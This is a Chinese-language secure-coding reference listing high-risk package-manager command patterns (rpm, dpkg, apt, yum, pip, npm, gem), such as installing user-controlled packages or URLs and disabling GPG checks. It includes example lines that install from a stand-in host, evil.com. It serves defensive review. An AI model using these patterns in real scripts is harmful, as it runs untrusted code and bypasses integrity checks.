# rpm / dpkg / apt / yum / pip / npm / gem 命令安全风险

## 涉及的安全问题
- 命令注入（安装时自动执行脚本）
- 完整性校验缺失（安装未验证的包）
- 修改配置未校验参数（安装后修改系统配置）

## 高危模式

### 命令注入 — 安装时自动执行脚本
```bash
# rpm 安装/升级用户可控包
rpm -ivh "$USER_PACKAGE"
rpm -Uvh "$USER_PACKAGE"
# rpm 会执行包内的 pre/post install 脚本

# dpkg 安装用户可控包
dpkg -i "$USER_DEB"
# DEB 包中包含 maintainer scripts（preinst/postinst），安装时自动执行

# apt/yum/zypper 安装用户可控包名
apt-get install "$USER_PKG"
yum install "$USER_PKG"
zypper install "$USER_PKG"
# 包名可控 → 安装任意包（含恶意包或已知漏洞版本）
```

### 命令注入 — 脚本语言包管理器
```bash
pip install "$USER_PKG"
npm install "$USER_PKG"
gem install "$USER_PKG"
# 包名可控 → 安装恶意包 → 安装时执行任意代码（setup.py / postinstall）

# 从用户可控 URL 安装
pip install "$USER_URL"
npm install "$USER_URL"
rpm -ivh "$USER_URL"
# URL 可控 → 安装任意来源的包
```

### 完整性校验缺失 — 未验证的包
```bash
# 未验证 GPG 签名
rpm -ivh --nosignature "$PACKAGE"
yum install --nogpgcheck "$PKG"
apt-get install --allow-unauthenticated "$PKG"

# 从不可信源安装
pip install --trusted-host evil.com "$PKG"
npm install --registry http://evil.com "$PKG"
```
